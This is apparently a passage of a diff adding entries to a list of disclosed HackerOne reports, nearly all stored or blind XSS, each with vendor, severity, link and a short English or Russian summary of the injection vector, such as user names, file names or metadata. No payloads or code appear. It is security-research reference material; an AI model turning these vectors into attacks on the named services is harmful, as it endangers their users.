+  - `CVE-2018-10379` When using the dropdown that selects the groups or users that are allowed to push or merge to a protected branch within a project, it is possible to trigger a XSS with a malicious user name string.
+- **Stored XSS in "post last edited" option** — `Discourse` · `High` [↗](https://hackerone.com/reports/333507)
+  - **Victim** sees the *yellow pencil*, symbol of the edit.
+- **Очень жесткая XSS в личных сообщениях m.ok.ru** — `ok.ru` · `Critical` [↗](https://hackerone.com/reports/302253)
+  - Нашел багу в личных сообщениях в мобильной версии {F251208} Что нужно, чтоб заюзать:
+- **Persistent XSS in https://sandbox.reverb.com/item/** — `Reverb.com` · `High` [↗](https://hackerone.com/reports/333008)
+  - I found a Persistent XSS in a listing page.
+- **Stored XSS in Snapmatic + R★Editor comments** — `Rockstar Games` · `High` [↗](https://hackerone.com/reports/309531)
+  - ___________________________________________________________________________________________________________________________ I requested the disclosure of what I hope is the final report regarding stored cross-site-scripting vulnerabilities on the Rockstar Games SocialClub, to als
+- **Blind stored xss in demo form** — `Upserve` · `High` [↗](https://hackerone.com/reports/324194)
+  - Through Upserve's demo request form, @paresh_parmar found a blind XSS in a 3rd party package for Upserve's CRM system.
+- **XSS through document projects** — `Khan Academy` · `High` [↗](https://hackerone.com/reports/244902)
+  - Hello, I'm Ethan Luis McDonough ([@elmt2](https://www.khanacademy.org/profile/elmt2/) on Khan Academy), and I found a way to inject scripts into document projects.
+- **[metascraper] Stored XSS in Open Graph meta properties read by metascrapper** — `Node.js third-party modules` · `Critical` [↗](https://hackerone.com/reports/309367)
+  - `CVE-2018-3773` **metascrapper** is vulnerable to Stored XSS via Open Graph metadata, if they are used in HTML without any sanitization.
+- **новенькое (старенькое upgreid) хакерство: делаем демократию во всем в контакте (XSS - на англиском)** — `VK.com` · `Critical` [↗](https://hackerone.com/reports/316946)
+  - ето жесткое хакерство позволяло устроить массовую глючность в social set’ V Kontakte и зделать репост от имени любого челика открывшего сылку (особено страшно в росии где сажают за репосты) в контакти все оперативно исправили (3 месяца) у них реяльно золотые руки к сожелению глюч
+- **[simple-server] HTML with iframe element can be used as filename, which might lead to load and execute malicious JavaScript ** — `Node.js third-party modules` · `High` [↗](https://hackerone.com/reports/309641)
+  - `CVE-2018-3717` **simple-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.
+- **[simplehttpserver] Stored XSS in file names leads to malicious JavaScript code execution when directory listing is output in HTML** — `Node.js third-party modules` · `Critical` [↗](https://hackerone.com/reports/309648)
+  - `CVE-2018-3716` **simplehttpserver** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.
+- **[anywhere] An iframe element with url to malicious HTML file (with eg. JavaScript malware) can be used as filename and served via anywhere** — `Node.js third-party modules` · `Critical` [↗](https://hackerone.com/reports/309394)
+  - `CVE-2018-3717` **anywhere** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.
+- **[crud-file-server] Stored XSS in filenames when directory index is served by crud-file-server** — `Node.js third-party modules` · `Critical` [↗](https://hackerone.com/reports/311101)
+  - `CVE-2018-3726` **crud-file-server** allows to embed HTML in file names, which (in certain conditions) might lead to execute malicious JavaScript.
+- **Blind XSS in Mobpub Marketplace Admin Production | Sentry via demand.mopub.com (User-Agent)** — `X / xAI` · `High` [↗](https://hackerone.com/reports/275518)
+  - I've identified a Blind XSS vulnerability that fires in the Mobpub Marketplace Admin Production / Sentry dashboard and can be triggered by sending a HTTPS request to an endpoint from the domain **demand.mopub.com**.
+- **Markdown parsing issue enables insertion of malicious tags and event handlers** — `HackerOne` · `High` [↗](https://hackerone.com/reports/299728)
+  - When markdown is being presented as HTML, there seems to be a strange interaction between _ and @ that lets an attacker insert malicious tags.
+- **Stored XSS => community.ubnt.com ** — `Ubiquiti Inc.` · `High` [↗](https://hackerone.com/reports/294048)
+  - Due to an error on the user input validation process, it was possible to create posts in some forums on community.ubnt.com with arbitrary HTML code, an especially crafted message could inject Javascript code on the page, resulting in stored XSS.
+- **Хранимая XSS на странице "Виджет для авторизации"** — `VK.com` · `High` [↗](https://hackerone.com/reports/273960)
+  - Self-XSS на странице документации виджета.
+- **Хранимая XSS в функционале добавления аудио в WYSIWYG** — `VK.com` · `High` [↗](https://hackerone.com/reports/274112)
+  - —
+- **[marketplace.informatica.com] - Stored XSS** — `Informatica` · `High` [↗](https://hackerone.com/reports/277259)
+  - The researcher has identified and reported a Stored XSS in Informatica website and helped us in resolving the issue.
+- **Stored xss via template injection** — `WordPress` · `High` [↗](https://hackerone.com/reports/250837)
+  - Hello Sir , I found Stored XSS in https://mercantile.wordpress.org/ POC is attached .
+- **Report Design Critical Stored DOM XSS Vulnerability ** — `Infogram` · `Critical` [↗](https://hackerone.com/reports/282909)
+  - Another XSS vulnerability in report designer but this one is critical.
+- **Stored XSS via transloadit.com and imageproxy** — `Coursera` · `High` [↗](https://hackerone.com/reports/216822)
+  - Hello, due to poor input file validation on transloadit.com, it is possible to upload and process any filetype on their server, which would later be uploaded to coursera-profile-photos.s3.amazonaws.com.
+- **Stored xss в /lead_forms_app.php** — `VK.com` · `High` [↗](https://hackerone.com/reports/283539)
+  - XSS в "Форме сбора заявок".
+- **XSS в личных сообщениях** — `VK.com` · `High` [↗](https://hackerone.com/reports/281851)
+  - XSS в ссылках в личных сообщениях, приходящих в реалтайме.
+- **Stored XSS on profile page via Steam display name** — `Rockstar Games` · `High` [↗](https://hackerone.com/reports/282604)
+  - The researcher was able to demonstrate a XSS vulnerability by using their Steam nickname as the payload vector.
+- **XSS on infogram.com** — `Infogram` · `High` [↗](https://hackerone.com/reports/283565)
+  - There is a XSS on Report templates.
+- **Хранимая XSS в группе VK** — `VK.com` · `High` [↗](https://hackerone.com/reports/266072)
+  - Недостаточная фильтрация в боксе удаления приложения.
+- **Stored XSS on member post feed** — `Rockstar Games` · `High` [↗](https://hackerone.com/reports/264002)
+  - In this report, the researcher found a Stored XSS vulnerability in Profile Feeds.
+- **Blind stored xss [parcel.grab.com] > name parameter ** — `Grab` · `Critical` [↗](https://hackerone.com/reports/251224)
+  - ___my previously reported blind xss is fixed but i found same type of xss in diffrent area with more impact.___ where admin can see all the user's of application and this is one more impact full because it contains all the user's email address.
+- **Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload** — `Concrete CMS` · `High` [↗](https://hackerone.com/reports/247517)
+  - __Type of issue__: Core CMS issue __Level of severity__: External Attack Vector __Concrete5 version__: 8.2.0 RC2 rev.
+- **XSS on $shop$.myshopify.com/admin/ and partners.shopify.com via whitelist bypass in SVG icon for sales channel applications** — `Shopify` · `High` [↗](https://hackerone.com/reports/232174)
+  - Shopify allows developers to create a special type of application called a "[Sales Channel](https://help.shopify.com/api/sdks/sales-channel-sdk)".
+- **Stored XSS in comments on https://www.starbucks.co.uk/blog/*** — `Starbucks` · `High` [↗](https://hackerone.com/reports/218226)
+  - there are a lot of published blog post under https://www.starbucks.co.uk/blog/*.
+- **[compose.mixmax.com] Stored XSS on compose.mixmax.com in contact names.** — `Mixmax` · `High` [↗](https://hackerone.com/reports/235292)
+  - —
+- **Stored XSS on Files overview by abusing git submodule URL** — `GitLab` · `High` [↗](https://hackerone.com/reports/218872)
+  - There's a stored Cross-Site Scripting (XSS) vulnerability in the Files overview of a project due to the incorrect handling of a git submodule.
